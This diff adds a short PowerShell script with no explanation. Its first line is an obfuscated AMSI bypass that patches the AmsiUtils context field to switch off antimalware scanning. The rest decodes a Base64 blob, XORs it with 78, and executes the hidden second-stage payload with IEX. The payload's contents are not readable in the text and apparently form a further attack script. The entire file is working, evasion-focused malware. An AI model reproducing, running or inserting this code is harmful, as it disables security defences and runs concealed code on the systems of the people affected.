@@ -1,0 +1,9 @@
+
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
+$a = "ak4tTiJOJ04rTiBOOk5uTnNObk4ATitOOU5jTgFOLE4kTitOLU46Tm5OHU43Tj1OOk4rTiNOYE4ATitOOk5gTh1OIU4tTiVOK046Tj1OYE4aTg1OHk4NTiJOJ04rTiBOOk5mTmxOf053TnxOYE5/TnhOdk5gTn9OfU55TmBOf05/TmxOYk56TnpOek56TmdOdU5qTj1OOk48TitOL04jTm5Oc05uTmpOLU4iTidOK04gTjpOYE4JTitOOk4dTjpOPE4rTi9OI05mTmdOdU4VTixON046TitOFU4TThNOak4sTjdOOk4rTj1Obk5zTm5Ofk5gTmBOeE57TntOfU57TjJOa041Tn5OM051TjlOJk4nTiJOK05mTmZOak4nTm5Oc05uTmpOPU46TjxOK04vTiNOYE4cTitOL04qTmZOak4sTjdOOk4rTj1OYk5uTn5OYk5uTmpOLE43TjpOK049TmBOAk4rTiBOKU46TiZOZ05nTm5OY04gTitObk5+TmdONU51TmpOKk4vTjpOL05uTnNObk5mTgBOK045TmNOAU4sTiROK04tTjpObk5jThpON04+TitOAE4vTiNOK05uTh1ON049TjpOK04jTmBOGk4rTjZOOk5gTg9OHU4NTgdOB04LTiBOLU4hTipOJ04gTilOZ05gTglOK046Th1OOk48TidOIE4pTmZOak4sTjdOOk4rTj1OYk5+TmJObk5qTidOZ051TmpOPU4rTiBOKk4sTi9OLU4lTm5Oc05uTmZOJ04rTjZObk5qTipOL046Ti9Obk58TnBOaE5/Tm5OMk5uTgFOO046TmNOHU46TjxOJ04gTilObk5nTnVOak49TitOIE4qTixOL04tTiVOfE5uTnNObk5qTj1OK04gTipOLE4vTi1OJU5uTmVObk5sTh5OHU5uTmxObk5lTm5OZk4+TjlOKk5nTmBOHk4vTjpOJk5uTmVObk5sTnBObk5sTnVOak49TitOIE4qTixON046TitObk5zTm5OZk4VTjpOK042TjpOYE4rTiBOLU4hTipOJ04gTilOE050TnROD04dTg1OB04HTmdOYE4JTitOOk4MTjdOOk4rTj1OZk5qTj1OK04gTipOLE4vTi1OJU58TmdOdU5qTj1OOk48TitOL04jTmBOGU48TidOOk4rTmZOak49TitOIE4qTixON046TitOYk5+TmJOak49TitOIE4qTixON046TitOYE4CTitOIE4pTjpOJk5nTnVOak49TjpOPE4rTi9OI05gTghOIk47Tj1OJk5mTmdOM051TmpOLU4iTidOK04gTjpOYE4NTiJOIU49TitOZk5nTkRO"
+$b = [System.Convert]::FromBase64String($a)
+for ($x = 0; $x -lt $b.Count; $x++) {
+                ${B}[${x}] = ${B}[${X}] -bxor 78
+        }
+IEX ([System.Text.Encoding]::Unicode.GetString($b))
+
